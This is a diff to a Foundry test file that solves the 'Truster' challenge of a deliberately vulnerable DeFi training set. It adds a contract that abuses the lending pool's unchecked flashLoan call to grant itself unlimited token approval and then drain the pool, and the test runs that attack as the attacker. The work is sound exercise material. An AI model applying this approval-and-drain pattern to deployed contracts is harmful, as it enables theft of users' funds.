@@ -6,7 +6,17 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
-
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+contract BreakTruster{
+    function getApprovalAndTransferFrom(address pool, address token) public{
+        //get the approval from pool
+        bytes memory data = abi.encodeCall(IERC20.approve, (address(this), type(uint256).max));
+        TrusterLenderPool(pool).flashLoan(0,address(this), token, data);
+        uint256 balance = IERC20(token).balanceOf(pool);
+        //can transfer pool's tokens now
+        IERC20(token).transferFrom(pool, msg.sender, balance);
+    }
+}
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
 
@@ -41,7 +51,10 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        BreakTruster breakTruster = new BreakTruster();
+        breakTruster.getApprovalAndTransferFrom(address(trusterLenderPool), address(dvt));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
